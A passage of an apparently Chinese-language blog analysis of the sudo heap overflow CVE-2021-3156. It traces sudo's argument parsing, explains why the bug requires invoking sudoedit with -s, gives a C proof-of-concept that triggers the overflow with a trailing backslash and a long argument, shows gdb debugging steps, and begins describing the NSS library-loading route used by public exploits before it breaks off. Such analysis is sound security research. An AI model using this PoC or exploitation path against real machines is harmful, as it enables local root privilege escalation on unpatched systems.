+   <span class="token number">588</span>                  <span class="token keyword">for</span> <span class="token punctuation">(</span>src <span class="token operator">=</span> <span class="token operator">*</span>av<span class="token punctuation">;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span> src<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token number">589</span>                      <span class="token comment">/* quote potential meta characters */</span>
+   <span class="token number">590</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isalnum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span>src<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'_'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'-'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'$'</span><span class="token punctuation">)</span>
+   <span class="token number">591</span>                          <span class="token operator">*</span>dst<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token punctuation">;</span>
+   <span class="token number">592</span>                      <span class="token operator">*</span>dst<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>src<span class="token punctuation">;</span>
+   <span class="token number">593</span>                  <span class="token punctuation">&#125;</span>
+   <span class="token number">594</span>                  <span class="token operator">*</span>dst<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>
+   <span class="token number">595</span>              <span class="token punctuation">&#125;</span>
+   <span class="token number">596</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>cmnd <span class="token operator">!=</span> dst<span class="token punctuation">)</span>
+   <span class="token number">597</span>                  dst<span class="token operator">--</span><span class="token punctuation">;</span>  <span class="token comment">/* replace last space with a NUL */</span>
+   <span class="token number">598</span>              <span class="token operator">*</span>dst <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
+   <span class="token number">599</span>
+   <span class="token number">600</span>              ac <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">/* -c cmnd */</span>
+   <span class="token number">601</span>          <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>在处理命令行参数的时候，设置了 <code>MODE_RUN</code> 和 <code>MODE_SHELL</code> 的情况下，会对命令行参数进行重写，把所有元字符包括 <code>\</code> 都转义了，也就是单个反斜杠变成了两个反斜杠，导致后面的漏洞无法触发</p>
+<p>总结一下：</p>
+<ol>
+<li><code>MODE_RUN</code> 和 <code>MODE_SHELL</code> 不能都设置，因为在 sudo 程序的 <code>parse_args</code> 函数里会对反斜杠进行转义，导致漏洞无法触发</li>
+<li>触发漏洞需要设置 <code>MODE_RUN</code>，<code>MODE_EDIT</code>，<code>MODE_CHECK</code> 中的一个，同时要设置 <code>MODE_SHELL</code> 或 <code>MODE_LOGIN_SHELL</code></li>
+</ol>
+<p>那么 <code>MODE_RUN</code> 是不可以设置的，因为一旦设置 <code>MODE_RUN</code>，触发漏洞条件需要 <code>MODE_SHELL</code>，而 <code>MODE_RUN</code> 和 <code>MODE_SHELL</code> 同时存在会导致 <code>parse_args</code> 对反斜杠进行转义，导致漏洞无法触发</p>
+<p><strong>那么就要设置 <code>MODE_EDIT</code> 或者 <code>MODE_CHECK</code>，同时不能设置 <code>MODE_RUN</code></strong></p>
+<p>设置 <code>MODE_EDIT</code> 使用 <code>-e</code>，<code>MODE_LOGIN_SHELL</code> 使用 <code>-i</code>，<code>MODE_SHELL</code> 使用 <code>-s</code>，对应源码如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//src/parse_args.c</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+   <span class="token number">358</span>                  <span class="token keyword">case</span> <span class="token string">'e'</span><span class="token operator">:</span>
+   <span class="token number">359</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span>mode <span class="token operator">&amp;&amp;</span> mode <span class="token operator">!=</span> MODE_EDIT<span class="token punctuation">)</span>
+   <span class="token number">360</span>                          <span class="token function">usage_excl</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">361</span>                      mode <span class="token operator">=</span> MODE_EDIT<span class="token punctuation">;</span>
+   <span class="token number">362</span>                      sudo_settings<span class="token punctuation">[</span>ARG_SUDOEDIT<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>
+   <span class="token number">363</span>                      valid_flags <span class="token operator">=</span> MODE_NONINTERACTIVE<span class="token punctuation">;</span>
+   <span class="token number">364</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+   <span class="token number">402</span>                  <span class="token keyword">case</span> <span class="token string">'i'</span><span class="token operator">:</span>
+   <span class="token number">403</span>                      sudo_settings<span class="token punctuation">[</span>ARG_LOGIN_SHELL<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>
+   <span class="token number">404</span>                      <span class="token function">SET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_LOGIN_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">405</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+   <span class="token number">460</span>                  <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token operator">:</span>
+   <span class="token number">461</span>                      sudo_settings<span class="token punctuation">[</span>ARG_USER_SHELL<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>
+   <span class="token number">462</span>                      <span class="token function">SET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">463</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>MODE_CHECK</code> 在这里设置，使用 <code>-l</code></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//src/parse_args.c</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+   <span class="token number">416</span>                  <span class="token keyword">case</span> <span class="token string">'l'</span><span class="token operator">:</span>
+   <span class="token number">417</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span>mode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token number">418</span>                          <span class="token keyword">if</span> <span class="token punctuation">(</span>mode <span class="token operator">==</span> MODE_LIST<span class="token punctuation">)</span>
+   <span class="token number">419</span>                              <span class="token function">SET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_LONG_LIST<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">420</span>                          <span class="token keyword">else</span>
+   <span class="token number">421</span>                              <span class="token function">usage_excl</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">422</span>                      <span class="token punctuation">&#125;</span>
+   <span class="token number">423</span>                      mode <span class="token operator">=</span> MODE_LIST<span class="token punctuation">;</span>
+   <span class="token number">424</span>                      valid_flags <span class="token operator">=</span> MODE_NONINTERACTIVE<span class="token operator">|</span>MODE_LONG_LIST<span class="token punctuation">;</span>
+   <span class="token number">425</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+   <span class="token number">518</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> mode <span class="token operator">==</span> MODE_LIST<span class="token punctuation">)</span>
+   <span class="token number">519</span>          mode <span class="token operator">=</span> MODE_CHECK<span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那么有以下几种选择：</p>
+<ol>
+<li><code>-s -e</code></li>
+<li><code>-i -e</code></li>
+<li><code>-s -l</code></li>
+<li><code>-i -l</code></li>
+</ol>
+<p>但是，<code>-e</code> 和 <code>-l</code>，都会导致 <code>valid_flags</code> 的改变，最后在 532 行处，导致程序退出，所以上面的 4 种方式都无效</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//src/parse_args.c</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+   <span class="token number">127</span>  #define <span class="token function">DEFAULT_VALID_FLAGS</span>     <span class="token punctuation">(</span>MODE_BACKGROUND<span class="token operator">|</span>MODE_PRESERVE_ENV<span class="token operator">|</span>MODE_RESET_HOME<span class="token operator">|</span>MODE_LOGIN_SHELL<span class="token operator">|</span>MODE_NONINTERACTIVE<span class="token operator">|</span>MODE_SHELL<span class="token punctuation">)</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+   <span class="token number">249</span>      <span class="token keyword">int</span> valid_flags <span class="token operator">=</span> DEFAULT_VALID_FLAGS<span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+   <span class="token number">532</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> valid_flags<span class="token punctuation">)</span> <span class="token operator">!=</span> flags<span class="token punctuation">)</span>
+   <span class="token number">533</span>          <span class="token function">usage</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>查看源码还发现一处地方：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//src/parse_args.c</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+   <span class="token number">268</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>proglen <span class="token operator">></span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>progname <span class="token operator">+</span> proglen <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"edit"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token number">269</span>          progname <span class="token operator">=</span> <span class="token string">"sudoedit"</span><span class="token punctuation">;</span>
+   <span class="token number">270</span>          mode <span class="token operator">=</span> MODE_EDIT<span class="token punctuation">;</span>
+   <span class="token number">271</span>          sudo_settings<span class="token punctuation">[</span>ARG_SUDOEDIT<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>
+   <span class="token number">272</span>      <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>当程序的名字是 sudoedit 时，会设置 <code>MODE_EDIT</code>，而不会去修改 <code>valid_flags</code>，那么就可以达成漏洞利用的条件，这就是 poc 和目前已公开的 exp 都使用 sudoedit 而不适用 sudo 的原因</p>
+<p>那么只需要用 <code>sudoedit -s xxx</code>，就可以设置 <code>MODE_EDIT</code> 和 <code>MODE_SHELL</code>，而不设置 <code>MODE_RUN</code> 了</p>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><h3 id="调试前准备"><a href="#调试前准备" class="headerlink" title="调试前准备"></a>调试前准备</h3><p>使用源码编译的程序进行调试，编译后创建一个链接 sudoedit 到 sudo，或者改名 sudo 为 sudoedit（ubuntu 中的 sudoedit 其实是 sudo 的一个软链接），权限改为 root，并加上 sid 权限</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>为了更好操控 sudo 程序的环境变量，采用 execve 函数来执行 sudoedit，这里写一个 poc.c:</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//poc.c</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_ENVP</span> <span class="token expression"><span class="token number">0x1000</span></span></span>
+
+<span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span>MAX_ENVP<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
+        <span class="token keyword">char</span> a1<span class="token punctuation">[</span><span class="token number">65536</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token function">memset</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        a1<span class="token punctuation">[</span><span class="token number">65535</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>
+
+
+        <span class="token keyword">char</span> <span class="token operator">*</span>s_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token comment">//命令行参数</span>
+                <span class="token string">"sudoedit"</span><span class="token punctuation">,</span> <span class="token string">"-s"</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> a1<span class="token punctuation">,</span> <span class="token constant">NULL</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">int</span> envp_pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">//环境变量</span>
+                                                                    
+        <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/path/to/sudoedit"</span><span class="token punctuation">,</span> s_argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="调试开始"><a href="#调试开始" class="headerlink" title="调试开始"></a>调试开始</h3><p>使用 <code>sudo gdb ./poc</code>，执行 <code>catch exec</code> 跟踪 execve，<code>r</code> 命令运行</p>
+<p>setlocale 是 sudo 程序开头调用的函数，在这下断点，断下后 <code>finish</code> 即可进入 sudo 的 main 函数</p>
+<p><img src="/images/CVE-2021-3156/CVE-2021-3156-1.png" alt="entry"></p>
+<p>要注意的是，进入 main 函数后，最好删除 setlocale 的断点，以免后续的调用影响跟踪调试</p>
+<p>使用 <code>b 213</code> 下断点在 213 行处：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">212</span>         <span class="token comment">/* Load plugins. */</span>
+<span class="token number">213</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">sudo_load_plugins</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>policy_plugin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>io_plugins<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token number">214</span>             <span class="token function">sudo_fatalx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"fatal error, unable to load plugins"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>n</code> 命令步过，加载完 sudoers.so 库后，使用命令 <code>b set_cmnd</code> 在 set_cmnd 函数下断点，<code>c</code> 继续运行，来到断点处，并在 854 行下断点，继续运行</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">854</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>user_args <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token number">855</span>                     <span class="token function">sudo_warnx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"%s: %s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">,</span> <span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to allocate memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">856</span>                     <span class="token function">debug_return_int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">857</span>                 <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>user_args 的大小为 0x10002 即 65538 （<code>&quot;\\&quot; + &quot;A&quot; * 65535 + 2</code>），并记录 user_args 的 chunk 地址为 <code>0x55555558faa0</code></p>
+<p><img src="/images/CVE-2021-3156/CVE-2021-3156-2.png" alt="user_args_size"><br><img src="/images/CVE-2021-3156/CVE-2021-3156-3.png" alt="user_args"></p>
+<p>跟踪来到漏洞点处：</p>
+<p><img src="/images/CVE-2021-3156/CVE-2021-3156-4.png" alt="user_args"></p>
+<p>来到 870 处：</p>
+<p><img src="/images/CVE-2021-3156/CVE-2021-3156-5.png" alt="870"></p>
+<p>此时可以发现没有溢出，因为此时只复制了反斜杠字符后面的 <code>\0</code>，以及后面的 65535 个 A，本身 chunk 的大小是足够的</p>
+<p>但是，for 循环继续运行，<code>&quot;A&quot; * 65535</code> 又开始继续往后覆盖，此时溢出就出现了</p>
+<p><img src="/images/CVE-2021-3156/CVE-2021-3156-6.png" alt="overwrite"></p>
+<p>可以看到，溢出把下一个 chunk 的 size 字段都改了，后面 malloc 的时候触发 abort，导致程序异常退出了</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此时可以知道几点：</p>
+<ol>
+<li>user_args 的大小可以由命令行参数控制</li>
+<li>命令行参数中出现单个反斜杠字符结尾，则会导致堆溢出</li>
+<li>若单个反斜杠结尾出现在最后一个命令行参数，那么溢出的内容就是紧接着的环境变量，完全可控</li>
+<li>单个反斜杠结尾的命令行参数或者环境变量都能往 chunk 写入 <code>\0</code></li>
+</ol>
+<h3 id="NSS（Name-Service-Switch）"><a href="#NSS（Name-Service-Switch）" class="headerlink" title="NSS（Name Service Switch）"></a>NSS（Name Service Switch）</h3><p>目前公开的 exp 大都利用了 NSS（Name Service Switch）机制，这里简述 NSS 的机制</p>
+<p>首先是根据 <code>/etc/nsswitch.conf</code> 内容（例如下面这个），初始化链式的 name_database_entry 结构体</p>
+<pre class="line-numbers language-none"><code class="language-none"># &#x2F;etc&#x2F;nsswitch.conf
+#
+# Example configuration of GNU Name Service Switch functionality.
+# If you have the &#96;glibc-doc-reference&#39; and &#96;info&#39; packages installed, try:
+# &#96;info libc &quot;Name Service Switch&quot;&#39; for information about this file.
+
+passwd:         files systemd
+group:          files systemd
+shadow:         files
+gshadow:        files
+
+hosts:          files dns
+networks:       files
+
+protocols:      db files
+services:       db files
+ethers:         db files
+rpc:            db files
+
+netgroup:       nis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>name_database_entry 结构体定义如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">name_database_entry</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token comment">/* And the link to the next entry.  */</span>
+  <span class="token keyword">struct</span> <span class="token class-name">name_database_entry</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
+  <span class="token comment">/* List of service to be used.  */</span>
+  service_user <span class="token operator">*</span>service<span class="token punctuation">;</span>
+  <span class="token comment">/* Name of the database.  */</span>
+  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> name_database_entry<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>name</code> 字段就是 <code>group</code>，<code>shadow</code> 这些字符串，然后以 <code>next</code> 字段链接起来形成链表</p>
+<p>后面的 <code>files systemd</code> 是 service_user 结构体的 <code>name</code> 字段，定义如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">service_user</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token comment">/* And the link to the next entry.  */</span>
+  <span class="token keyword">struct</span> <span class="token class-name">service_user</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
+  <span class="token comment">/* Action according to result.  */</span>
+  lookup_actions actions<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token comment">/* Link to the underlying library object.  */</span>
+  service_library <span class="token operator">*</span>library<span class="token punctuation">;</span>
+  <span class="token comment">/* Collection of known functions.  */</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>known<span class="token punctuation">;</span>
+  <span class="token comment">/* Name of the service (`files', `dns', `nis', ...).  */</span>
+  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> service_user<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>需要使用服务的时候，如果库未加载，则会调用 <code>nss_load_library</code> 函数加载动态链接库</p>
+<p>在 set_cmnd 函数结束后，sudoers_lookup 会调用 <code>nss_load_library</code> 函数，源码如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//glibc/nss/nsswitch.c</span>
+<span class="token keyword">static</span> <span class="token keyword">int</span>
+<span class="token function">nss_load_library</span> <span class="token punctuation">(</span>service_user <span class="token operator">*</span>ni<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token comment">/* This service has not yet been used.  Fetch the service
+         library for it, creating a new one if need be.  If there
+         is no service table from the file, this static variable
+         holds the head of the service_library list made from the
+         default configuration.  */</span>
+      <span class="token keyword">static</span> name_database default_table<span class="token punctuation">;</span>
+      ni<span class="token operator">-></span>library <span class="token operator">=</span> <span class="token function">nss_new_service</span> <span class="token punctuation">(</span>service_table <span class="token operator">?</span><span class="token operator">:</span> <span class="token operator">&amp;</span>default_table<span class="token punctuation">,</span>
+                                     ni<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token comment">/* Load the shared library.  */</span>
+      <span class="token class-name">size_t</span> shlen <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span>
+                      <span class="token operator">+</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>__nss_shlib_revision<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">int</span> saved_errno <span class="token operator">=</span> errno<span class="token punctuation">;</span>
+      <span class="token keyword">char</span> shlib_name<span class="token punctuation">[</span>shlen<span class="token punctuation">]</span><span class="token punctuation">;</span>
+      <span class="token comment">/* Construct shared object name.  */</span>
+      <span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">,</span>
+                                              <span class="token string">"libnss_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
